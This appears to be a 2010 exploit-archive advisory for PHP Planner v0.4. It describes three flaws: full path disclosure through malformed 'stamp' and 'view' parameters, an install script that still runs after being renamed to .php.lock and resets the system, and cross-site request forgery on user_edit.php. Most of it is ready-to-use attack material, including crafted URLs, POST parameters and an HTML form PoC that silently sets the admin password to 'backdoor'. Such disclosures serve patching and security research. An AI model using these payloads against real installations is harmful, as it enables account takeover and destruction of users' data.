@@ -1,0 +1,68 @@
+# Title: phpplanner <= PHP Planner v.0.4 Multiple Vulnerabilities
+# Date: 13/05/10
+# Author: cp77fk4r | empty0page[SHIFT+2]gmail.com | www.DigitalWhisper.co.il
+# Software Link: http://phpplanner.sourceforge.net/
+# Version: <= v.0.4
+# Tested on: PHP
+#
+##[Full Path Disclosure]
+(Full Path Disclosure (FPD) vulnerabilities enable the attacker to see the
+path to the webroot/file. e.g.: /home/omg/htdocs/file/. Certain
+vulnerabilities, such as using the load_file() (within a SQL Injection)
+query to view the page source, require the attacker to have the full path to
+the file they wish to view. (OWASP))
+#
+http://[server]/phpplanner/manage.php?stamp=cP
+http://[server/phpplanner/index.php?view=cP
+#
+Will returne:
+#
+Warning: strftime() expects parameter 2 to be long, string given in
+[FPD]\phpplanner\lib\functions.php on line 87
+#and:
+Warning: date() expects parameter 2 to be long, string given in
+[FPD]\phpplanner\common.php on line 180
+#
+##[Remote System Init]
+Install_mysql.php's role is to create the database tables during
+installation of the system.
+After the end of his job, his name will be changed to
+"Install_mysql.php.lock":
+(rename(__FILE__,__FILE__ . '.lock');)
+#
+If the attacker will enter to this page (.php.lock) the code will run again
+and will reset the system.
+#
+##[Cross Site Request Forgery]
+(CSRF is an attack which forces an end user to execute unwanted actions on a
+web application in which he/she is currently authenticated. With a little
+help of social engineering (like sending a link via email/chat), an attacker
+may force the users of a web application to execute actions of the
+attacker's choosing. A successful CSRF exploit can compromise end user data
+and operation in case of normal user. If the targeted end user is the
+administrator account, this can compromise the entire web application.)
+(OWASP))
+#
+http://[server]/phpplanner/user_edit.php
+#
+To change the user's password:
+#
+HTTP GET: /user_edit.php
+HTTP POST: edtUsername = [victim's user name] && edtPassword = backdoor &&
+edtPassword2 =backdoor
+#
+PoC:
+#
+<form name="form1" method="post" action="http://
+[server]/phpplanner/user_edit.php">
+<input name="edtUsername" type="hidden" size="60"
+value="admin">
+<input name="edtPassword" type="hidden" size="60"
+value="backdoor">
+<input name="edtPassword2" type="hidden" size="60"
+value="backdoor">
+</form>
+
+#
+#
+[e0f]
